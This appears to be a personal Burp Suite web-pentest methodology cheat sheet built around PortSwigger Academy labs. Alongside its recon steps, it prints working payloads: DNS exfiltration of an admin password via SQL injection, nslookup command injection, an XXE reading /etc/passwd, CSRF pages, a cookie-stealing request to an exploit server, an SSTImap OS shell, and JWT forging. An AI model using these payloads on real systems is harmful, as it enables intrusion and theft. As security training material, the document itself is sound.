# Configure
## General settings
### Scope
- Configure **HTTP Proxy** to _show_ in-scope items only
- Configure **Logger** to _capture_ in-scope items only
- Configure **Logger** to _show_ in-scope items only

## Extensions
The follwing extensions may be useful :
- Authorize
- Upload scanner
- Param miner
- Turbo intruder
- Collaborator everywhere
- HTTP Request smuggler
- JWT Editor
- Active Scan ++
- Logger ++
- CORS*

# Methodology

## Step 1 - Discover attack surface
### Crawl target
The objective is to have as much information (_i.e._ web pages) as possible on our target.
1. Go on the _Dashboard_ tab
2. Click on New scan
3. Configure Crawl only
4. Run
This will add web pages on the _Target_ tab.

### Directory fuzzing
The objective is to have as much information (_i.e._ web pages) as possible on our target.
Send the root request (/) to _Intruder_, then :
1. Add the injection point at the end of the path e.g. `GET /$fuzz$ HTTP/2`
2. In the payload list, choose "Directories - Long"
3. Run the attack in _Sniper mode_
4. Check the responses status code and/or length to identify response.
This will add web pages on the _Target_ tab.

### File fuzzing
The objective is to have as much information (_i.e._ web pages) as possible on our target.
Send the root request (/) to _Intruder_, then :
1. Add the injection point at the end of the path e.g. `GET /$fuzz$ HTTP/2`
2. In the payload list, choose "Filenames - Long"
3. Run the attack in _Sniper mode_
4. Check the responses status code and/or length to identify response.
This will add web pages on the _Target_ tab.

An alternative recon should be done with different file extensions.

## Step 2 - Analyze the attack surface
### Analyze refrences (URLs found in code)
On the _Target_ tab :
1. Right-click the website root
2. Click on _Engagement tools_
3. Click on _Find references_
Check if new in-scope URLs can be found.

### Analyze comments
On the _Target_ tab :
1. Right-click the website root
2. Click on _Engagement tools_
3. Click on _Find comments_
Check if interesting data can be found.

### Analyze scripts
On the _Target_ tab :
1. Right-click the website root
2. Click on _Engagement tools_
3. Click on _Find scripts_
Check if interesting data can be found.

### Check anomalies
Anomalies are suspect behaviors that may or may not be harmful.
- 302 Redirect with a body

### Analyze cookies

## Step 2 - Identify sensitive features
### Password
- Password reset
- Password change

### User data
- Email change

## Step 3 - Identify vulnrabilities
### :white_check_mark: SQL injections
#### DNS exfiltration
Oracle - `'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % bjgsg SYSTEM "http://'||(select password from users where username='administrator')||'.8clatdya2m9x02ta9zxozvbmyd44svgk.oastify.com/">%bjgsg;]>'),'/l') from dual)||'`

### :white_check_mark: NoSQL injections
### :white_check_mark: Authentication
### :white_check_mark: Path traversal
#### Step 1 - Built-in scanner
- Use the built-in scanner : right-click the filename (e.g. https://example.com/?filename=text.jpg) and scan the selected insertion point.

#### Step 2 - Intruder
Send the upload request to _Intruder_, then 
1. Add the file name as the string to fuzz :
  - Fuzz the entire file name _e.g._ `filename=$fuzz$"`.
  - Fuzz only a part of the file name _e.g._ `filename=/my/path/$fuzz$"`.
2. In the payload list, choose "Fuzzing - Path traversal"
3. Run the attack in _Sniper mode_
4. Check the responses status code and/or length to identify filtered extensions.

### :white_check_mark: Command injection
_Burp suite extension : Active scan++ | Collaborator everywhere_
The main command injection objective is to extract data. Multiple ways to achieve this :
- Results reflected on the website
- Results written in non accessible files in the server (leverage with SSRF maybe)
- Results extracted with DNS request e.g. `test%40test.fr%7cnslookup%20-q%3dcname%20%60whoami%60.8y7ds87rolk2iziyuihztmwqwh28q0ep.oastify.com.%26` i.e. ``test@test.fr|nslookup -q=cname `whoami`.8y7ds87rolk2iziyuihztmwqwh28q0ep.oastify.com.&``

### :white_check_mark: Business logic vulnerabilities
### :white_check_mark: Information disclosure
### :white_check_mark: Access control
### :white_check_mark: File upload
_Burp suite extension : Upload Scanner_

<ins>Important</ins> : when identifying vulnerabilities with this extension, it may not reveal the real request is the _issue_ pane. To get the real request sent, copy paste the filename that was sent (usually a randomly generated filename), and search for it in Logger.
#### Basics
##### Manual - Identify filtered extensions
Send the upload request to _Intruder_, then 
1. Add the file extension as the string to fuzz _e.g._ `filename="file.$jpg$"`
2. In the payload list, choose "File extensions - Full"
3. Run the attack in _Sniper mode_
4. Check the responses status code and/or length to identify filtered extensions.
The extensions identified here must be excluded from the automated scan.

##### Manual - Identify extension filtering bypass with null-byte
This time, we want to use the null-byte to check if filtered extensions are accepted. For that, we want to fuzz all extensions and append a string like `%00.jpg` where `jpg` must be replaced by any allowed extension.
Send the upload request to _Intruder_, then 
1. Add the file extension as the string to fuzz _e.g._ `filename="file.$filtered_extension$%00.jpg"`
2. In the payload list set 1, choose "File extensions - Full"
3. Run the attack in _Sniper_ mode
4. Check the responses status code and/or length to filters bypass.

#### Automation
##### First scan
Run a first scan with all modules in order to check which are the different server responses. Based on those responses, we must determine :
- Which magic numbers are filtered
- Which file extensions are filtered
Then modules must be unselectioned in order to focus on unfiltered requests.

##### Second scan
Run a second scan that by configuring :
- Exclusion of previously identified filtered requests
- _ReDownloader parser options_ to make the extension fetch the file after it is uploaded. It will allow the extension to report any successful injection to the dashboard.

#### Advanced
Manual scan is needed because the extension can't test some cases :
- Upload a file to a different directory (e.g. using **../** or **..%2f**). The alternative directory may not handle the image in a secure way.
- If automated scan showed that EXIF injection is possible :
    - Use an ExifTool to modify the file uploaded
    - Modify the file directly in code c.f.
![Burp showing PHP RCE via EXIF](https://github.com/Molx32/websec/blob/main/img/fileuploadexif.png)
- SSRF with filename (check with collaborator everywhere?)

### :white_check_mark: Race conditions
### :white_check_mark: Server-side request forge (SSRF)
### :white_check_mark: Path traversal
#### LFI fuzzing
For fuzzing lists, use:
- Burp Pro default
- [Jhaddix fuzzing list](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt)
```
GET /image?filename=<INTRUDER_INPUT>
Host: 0a35003b04de89b2824392b5001e00b4.web-security-academy.net
```

### :white_check_mark: XXE Injection
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
### :white_check_mark: Cross-site scripting (XSS)
### :white_check_mark: Cross-site request forge (CSRF)
#### CSRF using Javascript fetch()
```
<html>
    <img src="https://0a6c003b049f971980cc0d63006a00f7.web-security-academy.net/?search=aaa%3b%20SameSite=None%3b%20Secure%3b%20Partitioned%3b%0d%0aSet-Cookie:%20csrf=toto%3b%20SameSite=None%3b%20Secure%3bPartitioned%3b">
    <script>
        fetch("https://0a6c003b049f971980cc0d63006a00f7.web-security-academy.net/my-account/change-email", {
            method: "POST",
            credentials: "include",
            mode: "no-cors",
            headers: {
              "Content-Type": "application/json",
              // 'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'csrf=toto&email=tttt3@tttt.com'
            // body: JSON.stringify({'field':'value'})
        });
  </script>
</html>
```

#### CSRF using Javascript XMLHTTPRequest()
```
// GET request
const req = new XMLHttpRequest();
req.open("GET", "http://www.example.org/example.txt");
req.send();

// POST request
formData="a=test&b=value";
xhr.open("POST", "/article/xmlhttprequest/post/user");
xhr.send(formData);

// Steal cookie
xhr = new XMLHttpRequest();
xhr.open("GET", "https://exploit-0a0300fb04fc12638190ba2101d8001a.exploit-server.net/data?" + document.cookie);
xhr.send();
```
#### CSRF using Javascript HTML
```
<html>
  <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</html>
```
### :white_check_mark: Cross-origin resource sharing (CORS)
### :white_check_mark: Clickjacking
### :white_check_mark: DOM-based vulnerabilities
#### Web messages
```
<iframe src="https://0a890020042f321d8079999700d00075.web-security-academy.net" style="overflow:hidden;height:100%;width:100%" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
<iframe src="https://0a890020042f321d8079999700d00075.web-security-academy.net" style="overflow:hidden;height:100%;width:100%" onload="this.contentWindow.postMessage('{\"type\":\"load-channel\",\"url\":\"javascript:alert(1)\"}','*')">
```
### :white_check_mark: WebSockets
### :white_check_mark: Insecure deserialization
#### Java
##### Install JDK 8
1. Download from [Oracle website](https://www.oracle.com/fr/java/technologies/javase/javase8-archive-downloads.html)
2. Install Burp extension Java Deserialization Scanner
3. Extension - Configure Java path to `C:\Program Files\Java\jdk1.8.0_202\java.exe`
4. Extension - Configure Ysoserial path to `C:\Users\cleme\Documents\01 - Bugbounty\TRAINING\YSOSERIAL\ysoserial-all.jar`

##### Exploit
###### OOBs exploits
Leverage [Python wrapper](https://github.com/Molx32/websec/blob/main/deserialization/ysoserial.py) to get all payloads in a file, then use Intruder and wait for collaborator to retrieve DNS calls.

#### Others
### :white_check_mark: GraphQL API vulnerabilities
### :white_check_mark: Server-side template injection
_Burp suite extensions : None_
_Third party tool : [SSTImap](https://github.com/vladko312/SSTImap)_

First order SSTI : when the detection is done on the HTTP reponse.
Second order SSTI : when the detection is done elsewhere _e.g._ on another page.

#### First order SSTI - Automated - Using SSTI Map
```
# Step 1 - Simple scan, injection being on *
python3 sstimap.py -e ERB --url https://0a4600cd04e18ff880924e140087006a.web-security-academy.net/?message=*

# Step 2 - Based on results, chose a payload, here OD shell
python3 sstimap.py -e ERB --url https://0a4600cd04e18ff880924e140087006a.web-security-academy.net/?message=* --os-shell
```
#### First order SSTI - Manual - Intruder
Send the request to _Intruder_, then 
1. Add the injection point
2. In the payload list, choose "Fuzzing - template injection"
3. Run the attack in _Sniper mode_
4. Check the responses status code and/or length to identify response.

#### :warning: NOT IMPLEMENTED YET :warning: Second order SSTI - Automated - Using SSTI Map
C.f. latest discussions : https://github.com/vladko312/SSTImap/issues/12

#### :warning: ONLY WORKS WITH REDIRECT :warning: Second order SSTI - Manual - Intruder
Send the request to _Intruder_, then 
1. Add the injection point
2. In the payload list, choose "Fuzzing - template injection"
3. In the Settings, configure **Follow redirections** to **In-scope only**
4. In the Resource pool, configure a **Delay between requests** fixed to 1000ms
5. Run the attack in _Sniper mode_
6. Check the responses status code and/or length to identify response.
Check all the results to see if the injection was sucessful. If it is, modify it to exploit it.

#### ⚠️TODO : find a payload list for all kind of template

### :white_check_mark: Web cache poisoning
### :white_check_mark: HTTP Host header attacks
#### Automated scan
1. Run Param Miner extension with all scans
2. Run `can selected insertion point` on the host header
#### Check reflection in response headers

### :white_check_mark: HTTP request smuggling
_Burp suite extensions : Param miner | HTTP Request Smuggler_
#### Step 1 - Scan
- Use the **Param Miner** (all options)
- Use the **HTTP Request Smuggler** (all options)
- Use the built-in scanner : right-click the **Host** header value and scan the selected insertion point.

#### Step 2 - Exploit

### :white_check_mark: OAuth authentication
### :white_check_mark: JWT attacks    
_Burp suite extensions : JWT Editor_
#### Unverified signature
This attack only requires to change the current username (or other values) in the token. Just modify the JWT content without modifying anything else.
Example :
```
{
    "iss": "portswigger",
    "sub": "wiener",
    "exp": 1703788096
}
```
...becomes...
```
{
    "iss": "portswigger",
    "sub": "administrator",
    "exp": 1703788096
}
```
#### Signature exploits
##### None signature
Send the request to _Repeater_ and go to _JWT Editor_ tab.
1. Click on **Attack**
2. Select **"none" Signing Algorithm**
3. Send different requests each proposed value (["none", "None", "NONE", "nOnE"])

#### Brute force key
Word list [here](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)
```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```
### Prototype pollution



## Various
### :white_check_mark: Work with hash
#### Identify hash
Dcode tool to identify hash [here](https://www.dcode.fr/identification-hash).
#### Crack hash
Online tool - [Crack station](https://crackstation.net)
#### Calculate hash
Online tool - [CyberChef](https://gchq.github.io/CyberChef)

#### Brute force hash
